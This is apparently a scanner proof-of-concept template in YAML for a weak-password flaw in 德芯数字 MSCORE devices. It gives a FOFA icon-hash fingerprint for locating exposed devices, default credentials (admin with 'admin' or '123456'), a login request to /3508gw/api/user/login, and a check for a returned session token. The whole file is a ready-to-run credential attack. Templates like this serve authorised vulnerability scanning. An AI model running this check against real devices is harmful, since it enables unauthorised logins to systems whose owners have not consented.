id: poc-yaml-dsdvb-mscore-weak-password
info:
  name: 德芯数字 MSCORE 弱口令漏洞
  severity: medium
  tags:
  - 弱口令
  finger: mscore
  fofa: icon_hash="-592805355"
variables:
  passwd: 'admin

    123456

    '
requests:
- method: POST
  path: /3508gw/api/user/login
  headers:
    Content-Type: application/x-www-form-urlencoded
  data: password={{.passwd}}&remember=false&username=admin
  expression: status_code == 200 && contains(body,"success") && contains(body,"\"username\":\"admin\"")
    && contains(body,"\"token\":") && contains(content_type,"application/json")
transport: http
